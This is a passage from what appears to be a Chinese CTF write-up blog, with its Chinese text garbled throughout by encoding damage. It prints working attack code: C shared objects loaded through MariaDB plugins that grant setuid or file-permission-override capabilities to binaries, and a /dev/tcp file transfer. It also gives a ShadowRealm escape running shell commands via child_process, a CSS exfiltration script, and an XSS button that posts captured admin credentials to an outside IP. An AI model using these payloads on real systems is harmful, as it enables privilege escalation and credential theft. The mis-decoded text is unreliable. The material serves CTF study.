ï¼šå…è®¸æ‰§è¡Œä¸€äº›ç³»ç»Ÿç®¡ç†ä»»åŠ¡ï¼Œå¦‚æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿã€‚ CAP_DAC_OVERRIDE ï¼šå…è®¸å¿½ç•¥æ–‡ä»¶çš„ä¼ ç»Ÿ Unix æƒé™ã€‚ CAP_SYS_PTRACE ï¼šå…è®¸è·Ÿè¸ªå…¶ä»–è¿›ç¨‹ã€‚ CAP_SETUID ï¼šå…è®¸è¿›ç¨‹æ”¹å˜å…¶æœ‰æ•ˆç”¨æˆ· IDã€‚ capability åç§° æè¿° CAPAUDITCONTROL å¯ç”¨å’Œç¦ç”¨å†…æ ¸å®¡è®¡ï¼›æ”¹å˜å®¡è®¡è¿‡æ»¤è§„åˆ™ï¼›æ£€ç´¢å®¡è®¡çŠ¶æ€å’Œè¿‡æ»¤è§„åˆ™ CAPAUDITREAD å…è®¸é€šè¿‡ multicast netlink å¥—æ¥å­—è¯»å–å®¡è®¡æ—¥å¿— CAPAUDITWRITE å°†è®°å½•å†™å…¥å†…æ ¸å®¡è®¡æ—¥å¿— CAPBLOCKSUSPEND ä½¿ç”¨å¯ä»¥é˜»æ­¢ç³»ç»ŸæŒ‚èµ·çš„ç‰¹æ€§ CAP_CHOWN ä¿®æ”¹æ–‡ä»¶æ‰€æœ‰è€…çš„æƒé™ CAPDACOVERRIDE å¿½ç•¥æ–‡ä»¶çš„ DAC è®¿é—®é™åˆ¶ CAP_DAC_READ_SEARCH å¿½ç•¥æ–‡ä»¶è¯»åŠç›®å½•æœç´¢çš„ DAC è®¿é—®é™åˆ¶ CAP_FOWNER å¿½ç•¥æ–‡ä»¶å±ä¸» ID å¿…é¡»å’Œè¿›ç¨‹ç”¨æˆ· ID ç›¸åŒ¹é…çš„é™åˆ¶ CAP_FSETID å…è®¸è®¾ç½®æ–‡ä»¶çš„ setuid ä½ CAPIPCLOCK å…è®¸é”å®šå…±äº«å†…å­˜ç‰‡æ®µ CAPIPCOWNER å¿½ç•¥ IPC æ‰€æœ‰æƒæ£€æŸ¥ CAP_KILL å…è®¸å¯¹ä¸å±äºè‡ªå·±çš„è¿›ç¨‹å‘é€ä¿¡å· CAP_LEASE å…è®¸ä¿®æ”¹æ–‡ä»¶é”çš„ FL_LEASE æ ‡å¿— CAPLINUXIMMUTABLE å…è®¸ä¿®æ”¹æ–‡ä»¶çš„ IMMUTABLE å’Œ APPEND å±æ€§æ ‡å¿— CAPMACADMIN å…è®¸ MAC é…ç½®æˆ–çŠ¶æ€æ›´æ”¹ CAPMACOVERRIDE å¿½ç•¥æ–‡ä»¶çš„ DAC è®¿é—®é™åˆ¶ CAP_MKNOD å…è®¸ä½¿ç”¨ mknod () ç³»ç»Ÿè°ƒç”¨ CAPNETADMIN å…è®¸æ‰§è¡Œç½‘ç»œç®¡ç†ä»»åŠ¡ CAPNETBIND_SERVICE å…è®¸ç»‘å®šåˆ°å°äº 1024 çš„ç«¯å£ CAPNETBROADCAST å…è®¸ç½‘ç»œå¹¿æ’­å’Œå¤šæ’­è®¿é—® CAPNETRAW å…è®¸ä½¿ç”¨åŸå§‹å¥—æ¥å­— CAP_SETGID å…è®¸æ”¹å˜è¿›ç¨‹çš„ GID CAP_SETFCAP å…è®¸ä¸ºæ–‡ä»¶è®¾ç½®ä»»æ„çš„ capabilities CAP_SETPCAP å‚è€ƒ capabilities man page CAP_SETUID å…è®¸æ”¹å˜è¿›ç¨‹çš„ UID CAPSYSADMIN å…è®¸æ‰§è¡Œç³»ç»Ÿç®¡ç†ä»»åŠ¡ï¼Œå¦‚åŠ è½½æˆ–å¸è½½æ–‡ä»¶ç³»ç»Ÿã€è®¾ç½®ç£ç›˜é…é¢ç­‰ CAPSYSBOOT å…è®¸é‡æ–°å¯åŠ¨ç³»ç»Ÿ CAPSYSCHROOT å…è®¸ä½¿ç”¨ chroot () ç³»ç»Ÿè°ƒç”¨ CAPSYSMODULE å…è®¸æ’å…¥å’Œåˆ é™¤å†…æ ¸æ¨¡å— CAPSYSNICE å…è®¸æå‡ä¼˜å…ˆçº§åŠè®¾ç½®å…¶ä»–è¿›ç¨‹çš„ä¼˜å…ˆçº§ CAPSYSPACCT å…è®¸æ‰§è¡Œè¿›ç¨‹çš„ BSD å¼å®¡è®¡ CAPSYSPTRACE å…è®¸è·Ÿè¸ªä»»ä½•è¿›ç¨‹ CAPSYSRAWIO å…è®¸ç›´æ¥è®¿é—® /devportã€/dev/memã€/dev/kmem åŠåŸå§‹å—è®¾å¤‡ CAPSYSRESOURCE å¿½ç•¥èµ„æºé™åˆ¶ CAPSYSTIME å…è®¸æ”¹å˜ç³»ç»Ÿæ—¶é’Ÿ CAPSYSTTY_CONFIG å…è®¸é…ç½® TTY è®¾å¤‡ CAP_SYSLOG å…è®¸ä½¿ç”¨ syslog () ç³»ç»Ÿè°ƒç”¨ CAPWAKEALARM å…è®¸è§¦å‘ä¸€äº›èƒ½å”¤é†’ç³»ç»Ÿçš„ä¸œè¥¿ (æ¯”å¦‚ CLOCKBOOTTIMEALARM è®¡æ—¶å™¨) è®¾ç½®ä¸åˆ é™¤ Capabilities 12setcap cap_sys_admin+ep /usr/sbin/python #è®¾ç½®capabilitiesæƒé™setcap -r /usr/sbin/python #ç§»é™¤capabilitiesæƒé™ æŸ¥æ‰¾ Capabilities çš„æ–‡ä»¶ 12getcap -r / 2&gt;/dev/nullfind / -exec getcap &#123;&#125; ; 2&gt;/dev/null è¿™é‡Œ maraidb æœ‰ cap_setfcap çš„æƒé™ï¼Œå…è®¸ä¸ºæ–‡ä»¶è®¾ç½®ä»»æ„çš„ capabilities. å…¶ä¸€ å†™ä¸ª readflag 12345678910111213141516#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;// gcc readflag.c -o readflagint main() &#123; char *buffer[1024]; setuid(0); FILE* f = fopen(&quot;/flag&quot;, &quot;r&quot;); fread(buffer, 1024, 1, f); fclose(f); printf(&quot;%s\\n&quot;, buffer);&#125; ä¸‡èƒ½çš„ base64 å†™ä¸€åˆ‡ å†å†™ä¸€ä¸ªè°ƒç”¨ cap_set_file ç»™ readflag æŒ‚ä¸Š cap_setuid=ep ä¹‹åç”¨ mariadb åŠ è½½æ¶æ„ so, mariadb â€“plugin-dir=/mysql/plugin/ â€“default-auth=setcap 123456789101112131415#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;sys/capability.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;// setcap cap_setuid+ep readflag// /usr/bin/mariadb cap_setfcap=ep// gcc -fPIC -shared setcap.c -o setcap.so -lcap__attribute__ ((__constructor__)) void test (void)&#123; cap_t cap = cap_from_text(&quot;cap_setuid+ep&quot;); cap_set_file(&quot;/mysql/plugin/readflag&quot;, cap);&#125; cap_t cap = cap_from_text(&quot;cap_setuid+ep&quot;); ï¼šè¿™è¡Œä»£ç ä½¿ç”¨ cap_from_text å‡½æ•°åˆ›å»ºä¸€ä¸ªèƒ½åŠ›é›†ï¼ˆcapability setï¼‰ã€‚åœ¨ Linux ä¸­ï¼Œèƒ½åŠ›é›†æ˜¯ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œç”¨äºç®¡ç†è¿›ç¨‹å¯¹ç³»ç»Ÿèµ„æºå’Œæ“ä½œçš„è®¿é—®æƒé™ã€‚ cap_setuid+ep è¡¨ç¤ºå¯ç”¨ &quot;è®¾ç½®ç”¨æˆ·æ ‡è¯†&quot;ï¼ˆ cap_setuid ï¼‰å’Œ &quot;æå‡ç‰¹æƒ&quot;ï¼ˆ ep ï¼Œæ„å‘³ç€æ•ˆæœæŒä¹…ï¼‰ï¼Œè¿™æ„å‘³ç€ç¨‹åºå°†å…·æœ‰æå‡æƒé™çš„èƒ½åŠ›. äººè¨€ï¼šè·å– cap_setuid è¿™ç§ cap, ç„¶åç»™ readflag èµ‹ä¸Š cap_set_file(&quot;/mysql/plugin/readflag&quot;, cap); ï¼šç»™ readflag ä¸Šæƒé™ ç¼–è¯‘ 1gcc -fPIC -shared setcap.c -o setcap.so -lcap -lcap æ˜¯ç¼–è¯‘ C/C++ ç¨‹åºæ—¶ä¼ é€’ç»™ç¼–è¯‘å™¨çš„é€‰é¡¹ä¹‹ä¸€ï¼Œç”¨äºæŒ‡å®šé“¾æ¥åˆ° Linux èƒ½åŠ›åº“ï¼Œä¸€äº›å¸¸è§çš„èƒ½åŠ›åº“å‡½æ•°åŒ…æ‹¬ cap_from_text å’Œ cap_set_file åœ¨è¿™é‡Œé¢ rnm, ç¼–è¯‘ä¸å‡ºæ¥ï¼Œæœ¬åœ°ç¼–è¯‘å§ã€‚æŠ¥é”™:fatal error: sys/capability.h 1sudo apt-get install libcap-dev è§£å†³ä¸€ä¸‹ 1mariadb â€“-plugin-dir=/tmp â€“-default-auth=cap &amp; å…¶äºŒ 123456789101112131415161718192021222324252627#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/capability.h&gt;void lshell()&#123; cap_t caps = cap_from_text(&quot;cap_dac_override=eip&quot;); cap_set_file(&quot;/bin/cat&quot;, caps); printf(&quot;setcap finished\\n&quot;);&#125;class LOLITA &#123;public: LOLITA()&#123; lshell(); &#125;&#125;;LOLITA _mysql_client_plugin_declaration_;//compile: g++ evil.c -shared -fPIC -o cap.so -lcap2```å°†ç¼–è¯‘å‡ºæ¥çš„æ–‡ä»¶ä¼ åˆ°é¶æœºï¼ˆdd &lt; /dev/tcp/ip/port &gt; cap.soï¼‰ åŠ è½½è¿™ä¸ªsoè®©/bin/catè·å–cap_dac_overrideï¼ˆå¿½ç•¥æ–‡ä»¶æƒé™ï¼‰çš„ç‰¹æƒ ```mariadb --plugin-dir=. --default-auth=capcat /flag``` åŠ«æŒ php 12345678910111213141516171819202122#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;dlfcn.h&gt;// #include &lt;sys/capability.h&gt;typedef void* cap_t;typedef cap_t (*cap_from_text_t)(const char *);typedef int (*cap_set_file_t)(const char *, cap_t);__attribute__((constructor)) void init(int argc, char *argv[]) &#123; printf(&quot;cap.c: init()\\n&quot;); void *handle = dlopen (&quot;/lib/x86_64-linux-gnu/libcap.so.2&quot;, RTLD_LAZY); cap_from_text_t cap_from_text = (cap_from_text_t)dlsym(handle, &quot;cap_from_text&quot;); cap_set_file_t cap_set_file = (cap_set_file_t)dlsym(handle, &quot;cap_set_file&quot;); cap_set_file(&quot;/usr/local/bin/php&quot;, cap_from_text(&quot;cap_setuid+ep&quot;));&#125; æ›´åŠçš„ 1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/capability.h&gt;void _init()&#123; cap_t caps = cap_init(); if (caps == NULL) &#123; perror(&quot;cap_init&quot;); exit(EXIT_FAILURE); &#125; cap_value_t cap_list[4]; //cap_list[0] = CAP_SYS_ADMIN; cap_list[0] = CAP_SETFCAP; cap_list[1] = CAP_CHOWN; cap_list[2] = CAP_SETUID; cap_list[3] = CAP_SETGID; if (cap_set_flag(caps, CAP_EFFECTIVE, 4, cap_list, CAP_SET) == -1 || cap_set_flag(caps, CAP_INHERITABLE, 4, cap_list, CAP_SET) == -1 || cap_set_flag(caps, CAP_PERMITTED, 4, cap_list, CAP_SET) == -1) &#123; perror(&quot;cap_set_flag&quot;); cap_free(caps); exit(EXIT_FAILURE); &#125; const char *filename = &quot;/tmp/perl&quot;; if (cap_set_file(filename, caps) == -1) &#123; perror(&quot;cap_set_file&quot;); cap_free(caps); exit(EXIT_FAILURE); &#125; cap_free(caps);&#125; mdğŸ˜¡å…¶å®ƒå‡ å®¶çš„åå¼¹ shellpayload æœ‰é—®é¢˜ï¼Œåå¼¹ shell äº†ä»¥åå°±ä¸€ç›´è¿ä¸ä¸Š mariadb äº†ï¼Œæœ€åè¿˜æ˜¯ç”¨äº† lolita çš„ exp æ‰“ï¼Œä¸€éè¿‡ï¼Œæœç„¶ lolita è¿˜æ˜¯çˆ±æˆ‘çš„ğŸ¥°ğŸ¥°ğŸ¥°. è¿™ç§ç»ˆå‡ºçš„æ„Ÿè§‰è°æ‡‚å•Šï¼Œå¥½âˆšâ…§ èˆ’æœå•Šï¼Œâˆšâ…§ å¥½èˆ’æœå•Š. ytiruces ğŸ‘´ä¸æƒ³å¤ç°ï¼Œç¯å¢ƒä¸å¥½æï¼ŒğŸ‘´è´´ä¸ª exp åœ¨è¿™ 12345678910111213141516171819202122232425262728import stringimport socketpayload = &#x27;https://ytiruces.ctfpunk.com/?content=%3Cp%3E%3Cstyle%3E#style#%3C/style%3E%3Cvideo%20controls%20playsinline%20autoplay%20muted%20loop%3E%3Csource%20src=%22https://n1s.ctf.hurrison.com/test.webm%22%3E%3Ctrack%20src=%22/flag?name=WEBVTT%250a00:00.000--%3E00:13.000%250a%3Cv%22%20default%3E&#x27;flag = &#x27;n1ctf&#123;I&#x27;style = &#x27;::cue(v[voice^=%22&#x27; + flag + &#x27;#x#%22])%20&#123;%20background:%20url(https://n1.ctf.hurrison.com/?f=#x#);%20&#125;%0a&#x27;s = &#x27;&#x27;table = string.ascii_letters + &#x27;&#123;&#x27; + &#x27;&#125;&#x27;for x in table: s += style.replace(&#x27;#x#&#x27;, x)payload = payload.replace(&#x27;#style#&#x27;, s)print(payload)ip = &#x27;119.28.143.13&#x27;port = 32890s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((ip, port))d = s.recv(256)print(d)s.send(payload.encode()) ggbondâ€™s gogs ğŸ‘´çœŸä¸æ˜¯æ‡’ï¼Œæ²¡ç¯å¢ƒå¤ç°ä¸ªé’©å­ï¼Œtmd å½“ğŸ‘´â­ğŸ˜¡å§. dockerdebug 123456789#FROM openjdk:8-alpineFROM adoptopenjdk/openjdk11COPY SimpleAPI-1.0-SNAPSHOT.jar /tmp/web.jarCOPY flag /flagCOPY start.sh /start.shRUN chmod +x /start.shENTRYPOINT /start.sh EXPOSE 8877EXPOSE 3345 12345touch /tmp/app.logchmod 666 /tmp/app.lognohup java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:3345 -jar /tmp/web.jar &gt;/tmp/app.log 1docker run -d -p 8877:8877 -p 63342:63342 remote_debug è¿è¡Œè¿œç¨‹è¿æ¥ debug ä¸“ç”¨çš„ç«¯å£","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://1llustrious.github.io/tags/CTF/"}]},{"title":"DAS0RAYSXCBCTF","slug":"DAS0RAYSXCBCTF","date":"2023-11-30T08:12:36.000Z","updated":"2023-11-30T13:36:00.110Z","comments":true,"path":"2023/11/30/DAS0RAYSXCBCTF/","link":"","permalink":"https://1llustrious.github.io/2023/11/30/DAS0RAYSXCBCTF/","excerpt":"","text":"DAS0RAYSxCBCTF å†™åœ¨å‰é¢ yet another box Stack trace API Shadow-Realm-API dynamic import æ–¹æ¡ˆ exp nps å¼€æ‰“ğŸ˜“ remote å¹²ğŸ¤ª å¿†ï¼æ‚Ÿï¼è¿™å°±æ˜¯ xss çš„æœºå™¨äººåˆ›é€  exp Deserialize?Upload! actuatorğŸ˜« é¢˜ç›®å®è·µğŸ˜“ğŸ˜¡ ååºåˆ—åŒ–åˆ†æğŸ˜› æ–‡ä»¶ä¸Šä¼  + ååºåˆ—åŒ–ç»„åˆæ‹³ğŸ˜¤ DASCTFXCBCTF_2023_bypassJava Content-Length é™åˆ¶ chuncked ç¼–ç æ€ä¹ˆå‘ ä¸ç¨³å®š jackson é“¾é—®é¢˜ æµç¨‹ ä¸ºä»€ä¹ˆé¡ºåºä¸ä¸€å®š è§£å†³æ–¹æ³•ğŸ˜Š å®ç° æ„é€  å†…å­˜ğŸçš„ä½¿ç”¨ğŸ¥µğŸ‘´ åˆ—ç›®å½• è¯»æ–‡ä»¶ RASPğŸ˜…ğŸ˜¡ å•¥äº‹ RASP è§£å†³æ–¹æ¡ˆğŸ˜’ JNI è§„èŒƒ DAS0RAYSxCBCTF å†™åœ¨å‰é¢ wcsnmd, è°ç»™ğŸ‘´å‡ºçš„è¿™ä¹ˆæ¶å¿ƒçš„ web,nmd çˆ†é›¶äº†ï¼Œtmd æ€»å…± 3100 çš„è§£ï¼Œä»€ä¹ˆâˆšâ‘§ç©æ„å„¿. wp:â€Œâ€ â¡ â£â€Œâ€ â€â£â¢â¢ â€Œâ€â€¬ â£ â€Œâ£â¢â€Œâ¡â¤â¢â¤â¤â€Œâ€Œâ¡â¢â€Œâ€ â£â€Œâ€Œâ¡â£ DASCTF x CBCTF - é£ä¹¦äº‘æ–‡æ¡£ (feishu.cn) DASCTFXCBCTF_2023_bypassJava_Wp (pankas.top) yet another box è¿™é¢˜æ˜¯ä¸€ä¸ªæ¯”è¾ƒæ–°çš„æ²™ç®± shadowrealm , è¿™ byd å’Œ node çš„ vm8 å¤ªä¸€æ ·ï¼Œæœ‰ç€è‡ªå·±çš„å…¨å±€å¯¹è±¡å’Œå†…ç½®å‡½æ•°ï¼Œå°±æŒºæŠ½è±¡ï¼Œæ²¡æ³•åƒ vm , ä¹Ÿæ— æ³•é€šè¿‡ prototype pollution æ§åˆ¶ä¸»æ¨¡å—ä¸­çš„å†…ç½®å±æ€§å¦å¤–ç”±äºä¸ package.json å£°æ˜äº† â€œtypeâ€:â€œmoduleâ€ ä¸”æ–‡ä»¶ç»“å°¾ä¸º .mjsï¼Œæ‰€é‡‡ç”¨çš„ ESM é»˜è®¤ strict modeï¼Œæ— æ³•é€šè¿‡ [stack-trace-api](Stack trace APIãƒ»V8 â€” å †æ ˆè·Ÿè¸ª APIãƒ»V8 å‘åŠ¨æœº) è·¨ä¸Šä¸‹æ–‡å–å¾—å¯åˆ©ç”¨å¯¹è±¡ã€‚ Stack trace API ä»…ä½œä¸ºå­¦ä¹ è®°å½•ä½¿ç”¨ï¼Œå¹¶ä¸ä¸ºæœ¬é¢˜æä¾›æ€è·¯. é»˜è®¤æƒ…å†µä¸‹ï¼ŒV8 æŠ›å‡ºçš„å‡ ä¹æ‰€æœ‰é”™è¯¯éƒ½æœ‰ä¸€ä¸ªå±æ€§ï¼ŒæŠ›å‡ºé”™è¯¯çš„æ—¶å€™ä¼šç”¨åˆ°æ–¹æ³•ï¼Œè¯¥æ–¹æ³•èƒ½è·å¾—åˆ°å¤–é¢çš„å…¨å±€å¯¹è±¡. Shadow-Realm-API Wrapped Function Exotic Objects æ˜¯ä¸€ç§å¥‡å¼‚å¯¹è±¡ï¼Œå†…å«ä¸€ä¸ªå›è°ƒå‡½æ•°ã€‚å…·æœ‰ä¸€äº›å†…ç½®æ§½ slot ,: Internal slots Type Description [[WrappedTargetFunction]] Callable Object Stores the callable object. [[Call]] The [[Call]] internal method Executes code associated with this objectâ€™s [[WrappedTargetFunction]]. [[Realm]] Realm Record The realm in which the function was created. è¿˜æœ‰ [[Prototype]] and [[Extensible]] å¯¹è±¡çš„ [[call]] æ–¹æ³•è·å–ä¸¤ä¸ªå‚æ•°:thisArgument, argumentsList . è°ƒç”¨æ—¶ä¼šå®ç°ä»¥ä¸‹æ­¥éª¤: 1. è®¾ç½®è¿è¡Œä»£ç çš„ä¸Šä¸‹æ–‡ã€‚æ‰§è¡Œä¸Šä¸‹æ–‡é€šå¸¸åŒ…æ‹¬æ‰§è¡Œå‡½æ•°çš„ä½œç”¨åŸŸã€å˜é‡ã€this å€¼ç­‰ä¿¡æ¯ã€‚ 2. è®¾ç½®æ–°çš„ä½œç”¨åŸŸ calleecontext. 3. æ‰§è¡Œ assert æ–­è¨€ï¼Œç¡®ä¿ calleecontext æ˜¯ç›®å‰æ­£åœ¨æ‰§è¡Œçš„ä¸Šä¸‹æ–‡. 4. ç”¨ result å‚¨å­˜ **OrdinaryWrappedFunctionCall (F, thisArgument, argumentsList)** çš„è¿è¡Œç»“æœ 5.calleeContext è¢«ä»æ‰§è¡Œä¸Šä¸‹æ–‡æ ˆä¸­ç§»é™¤ï¼Œè€Œ callerContext è¢«æ¢å¤ä¸ºå½“å‰è¿è¡Œçš„æ‰§è¡Œä¸Šä¸‹æ–‡ã€‚ 6. åˆ¤æ–­è¿”å›ç±»å‹ï¼Œå¦‚æœ [[TYPE]] å·²è¿”å›ï¼Œåˆ™è¿”å› value. 7. å¤„ç†å¼‚å¸¸ 8. æ‰§è¡Œç»“æŸ. dynamic import æ–¹æ¡ˆ é€šè¿‡åŠ¨æ€ import å…è®¸æˆ‘ä»¬æŒ‰éœ€åŠ è½½ JavaScript æ¨¡å—ï¼Œè€Œä¸ä¼šåœ¨æœ€å¼€å§‹çš„æ—¶å€™å°±å°†å…¨éƒ¨æ¨¡å—åŠ è½½ã€‚ åŠ¨æ€ import è¿”å›äº†ä¸€ä¸ª Promise å¯¹è±¡ï¼Œè¿™ä¹Ÿæ„å‘³ç€å¯ä»¥åœ¨ then ä¸­ç­‰æ¨¡å—åŠ è½½æˆåŠŸåå»åšä¸€äº›æ“ä½œã€‚ æ‰€ä»¥ import å¯¼å…¥éœ€è¦é€šè¿‡ then å»è§¦å‘å…¶æ–¹æ³•. import åœ¨æ‰§è¡Œæ–¹æ³•åä»ç„¶æ˜¯ promise å¯¹è±¡ï¼Œé‡‡ç”¨çš„ç±»ä¼¼äºé“¾å¼è°ƒç”¨. 123var test = import(&quot;child_process&quot;).then(m=&gt;console.log(m)) å…¶ä¸­ test è·å– promise å¼‚æ­¥å¯¹è±¡ï¼Œè€Œ m ç›´æ¥å°±è·å¾— child_process å¯¹è±¡. exp ç®€è€Œè¨€ä¹‹ 1ShadowRealm.prototype.evaluate =&gt; PerformShadowRealmEval =&gt; Execution Contexts æ”¯æŒ dynamic import â€œDynamic importâ€ æ˜¯æŒ‡åœ¨ JavaScript ä¸­åŠ¨æ€åŠ è½½æ¨¡å—æˆ–æ–‡ä»¶çš„èƒ½åŠ›ã€‚è¿™æ˜¯ ECMAScript 2020 æ ‡å‡†çš„ä¸€éƒ¨åˆ†ï¼Œå¼•å…¥äº† import () å‡½æ•°ï¼Œå®ƒå¯ä»¥åœ¨è¿è¡Œæ—¶å¼‚æ­¥åŠ è½½æ¨¡å—ã€‚è¿™ä¸ä¼ ç»Ÿçš„é™æ€ import è¯­å¥ä¸åŒï¼Œåè€…åœ¨ä»£ç åŠ è½½æ—¶å³ç¡®å®šäº†è¦å¯¼å…¥çš„æ¨¡å—ã€‚ 12import(&#x27;child_process&#x27;).then(m=&gt;m.execSync(&#x27;/readflag &gt; /app/asserts/flag&#x27;));1; nps md åˆæ˜¯ xss,ğŸ‘´åˆ tnnd ä¸ä¼šï¼Œã—ã­ï¼ ğŸ§€ä¸€ä¸ª nps ç½‘ç«™ä¸Šçš„ xss. æ¶‰åŠ CVE-2023-46486 é¡¹ç›®åœ°å€ å½±å“èŒƒå›´: nps&lt;=V0.26.10 ä½  tm æè¿™æ”¾å±å‘¢ï¼Œæœ€æ–°ç‰ˆæœ¬å°±æ˜¯è¿™ä¸ªï¼Œ21 å¹´æœ€å publish äº†. æ¼æ´æ€ä¹ˆä¸ªäº‹: bootstrapTable å¹¶æœªé…ç½® escape å­—æ®µï¼Œä¸”ä½¿ç”¨æ—¶ä¸æ”¹é»˜è®¤é…ç½® kokodayo,web/views/client/list.html è¿™é‡Œè®¾ç½®å…¬é’¥ï¼Œé˜²æ­¢è¢« ntr (è¢«åˆ«äººç”¨ä»£ç†), ä½ ä¹Ÿä¸å¸Œæœ›ä½ æ‹¿ä¸åˆ° shell å§ (bushi) åŒä¸ºä»£ç†ï¼Œç»å¸¸è¢«æèµ·çš„ frp å’Œ venom éƒ½æ²¡å¤ªæ³¨æ„å…¬é’¥ï¼Œå®é™…ä¸Šæ˜¯æœ‰å…¬é’¥è¿™ä¸€é€‰é¡¹çš„. è¿™é‡Œï¼Œæˆ‘ä»¬å®Œå…¨å°±èƒ½å¤Ÿé€šè¿‡å®¢æˆ·ç«¯å»è¿›è¡Œæ”»å‡»äº†. å¼€æ‰“ğŸ˜“ cnm,sbwindows, æ­»æ´»ç”¨ä¸æˆï¼Œlinux ä¸€ä¸‹å°±å‡ºæ¥äº†å’ŒğŸ‘´ğŸ˜¡äº† âˆšâ‘§ç©æ„ï¼Œå½“ğŸ‘´â­ğŸ˜¡å§ é¦–å…ˆä¸‹è½½å®¢æˆ·ç«¯ï¼Œè¿™ä¸€ç‚¹å’Œ frp çš„ admin ç«¯å’Œ agent ç«¯ç±»ä¼¼ ç„¶åé…ç½®å®¢æˆ·ç«¯çš„é…ç½®æ–‡ä»¶ 12345[common]server_addr=127.0.0.1:8024conn_type=tcpvkey=123remark=&lt;sCRiPt&gt;alert(`nps hacker`)&lt;/sCrIpT&gt; Ã— æˆåŠŸäº†ï¼Œç‹ ç‹ åœ° Ã— è¿›å» remote å¹²ğŸ¤ª å¿†ï¼æ‚Ÿï¼è¿™å°±æ˜¯ xss çš„æœºå™¨äººåˆ›é€  é¦–å…ˆé¢˜ç›®é€šè¿‡ js ä»£ç é€ äº†ä¸ªåå°æœºå™¨äººï¼ŒğŸ‘´å¾ˆå–œæ¬¢ 1234567891011121314151617181920212223242526272829303132333435363738394041424344import &#123;chromium, errors&#125; from &quot;playwright-chromium&quot;;const PASSWORD = &quot;DASCTF_flag&quot;;(async () =&gt; &#123; async function visit() &#123; const page = await context.newPage(); try &#123; for (let i = 0; i &lt; 3; i++)&#123; try&#123; await page.goto(&#x27;http://a.o.com:8080/client/list&#x27;); break; &#125;catch (e) &#123; console.log(e); &#125; &#125; await page.waitForTimeout(1000); const element = await page.isVisible(&#x27;button[langtag=&quot;word-login&quot;]&#x27;); if (element) &#123; await page.fill(&#x27;input[name=&quot;username&quot;]&#x27;, &#x27;admin&#x27;); await page.fill(&#x27;input[name=&quot;password&quot;]&#x27;, PASSWORD); await page.click(&#x27;button[langtag=&quot;word-login&quot;]&#x27;); &#125; await page.waitForTimeout(1000); await page.close(); &#125; catch (e) &#123; if (e instanceof errors.TimeoutError)&#123; console.log(e); await page.close(); &#125;else&#123; console.log(e); &#125; &#125; &#125; const browser = await chromium.launch(&#123; headless: true &#125;); const context = await browser.newContext(); context.setDefaultTimeout(10000); setInterval(visit, 30000);&#125;)(); çœ‹ä¸æ‡‚æ²¡å…³ç³»ï¼ŒğŸ‘´æ¥å¸¦ä½ åˆ†æä¸€ä¸‹. é¦–å…ˆæ•´ä¸ªå°±æ˜¯ä¸€å¨ shitâ›°, é€šè¿‡ä¸€ä¸ªç®­å¤´å‡½æ•° () çš„æ–¹å¼ç«‹å³è°ƒç”¨ 123456const browser = await chromium.launch(&#123; headless: true &#125;); const context = await browser.newContext(); context.setDefaultTimeout(10000); setInterval(visit, 30000); é¦–å…ˆåˆ›å»ºä¸€ä¸ªæµè§ˆå™¨å’Œä¸Šä¸‹æ–‡ï¼Œç„¶åè®¾ç½® setIneterval, è¡¨ç¤ºæ¯ä¸‰åç§’è°ƒç”¨ visit, å‡½æ•°ï¼Œè®©ğŸ‘´çœ‹çœ‹ visit å‡½æ•°æ€ä¹ˆä¸ªäº‹ 123456789101112131415161718192021222324252627282930async () =&gt; &#123; async function visit() &#123; const page = await context.newPage(); try &#123; for (let i = 0; i &lt; 3; i++)&#123; try&#123; await page.goto(&#x27;http://a.o.com:8080/client/list&#x27;); break; &#125;catch (e) &#123; console.log(e); &#125; &#125; await page.waitForTimeout(1000); const element = await page.isVisible(&#x27;button[langtag=&quot;word-login&quot;]&#x27;); if (element) &#123; await page.fill(&#x27;input[name=&quot;username&quot;]&#x27;, &#x27;admin&#x27;); await page.fill(&#x27;input[name=&quot;password&quot;]&#x27;, PASSWORD); await page.click(&#x27;button[langtag=&quot;word-login&quot;]&#x27;); &#125; await page.waitForTimeout(1000); await page.close(); &#125; catch (e) &#123; if (e instanceof errors.TimeoutError)&#123; console.log(e); await page.close(); &#125;else&#123; console.log(e); &#125; &#125; &#125; é¦–å…ˆè·å–æ–°é¡µé¢ï¼Œç„¶åè®¿é—®ä¸‰æ¬¡ http://a.o.com:8080/client/list ä½ çœ‹çœ‹çœ¼ç†Ÿä¸ï¼Œ/client/list åˆšå¥½å°±æ˜¯åˆšæ‰å±•ç¤º xss çš„è·¯å¾„ï¼Œä½ å“ï¼Œä½ ç»†å“ã€‚è¿™ä¸ª host çœ¼ç†Ÿä¸ï¼Œè¿™å¯æ˜¯åœ¨ docker é‡Œé¢è®¾ç½®çš„åœ°å€æ˜ å°„å•Š. ãªã‚‰ã° ç­”ãˆã¯ã²ã¨ã¤ã  å°±æ˜¯ xss, æ¥ä¸‹æ¥å°±æ˜¯åˆ†æè¿™ä¸ªæœºå™¨äººäº‹æ€ä¹ˆæ“ä½œçš„äº†. é¦–å…ˆè¦çœ‹æœ‰æ—  button[langtag=&quot;word-login&quot;] è¿™ç©æ„ é‚£æˆ‘ä»¬å°±éœ€è¦è®¾ç½®ä¸€ä¸ª button äº†ï¼Œä¸è¿‡æˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œé¢ä¸‹ç‚¹æ¯’ 1&lt;button onclick=&quot;fetch(&#x27;http://43.143.192.19:1145/&#x27;,&#123;method:&#x27;POST&#x27;,body:$(&#x27;#username&#x27;)[0].value+&#x27;___&#x27;+$(&#x27;#password&#x27;)[0].value&#125;);&quot; langtang=&gt;&lt;/button&gt; $(â€˜#usernameâ€™) æ˜¯ä¸€ä¸ª jQuery é€‰æ‹©å™¨ï¼Œç”¨äºé€‰æ‹©å…·æœ‰æŒ‡å®š id 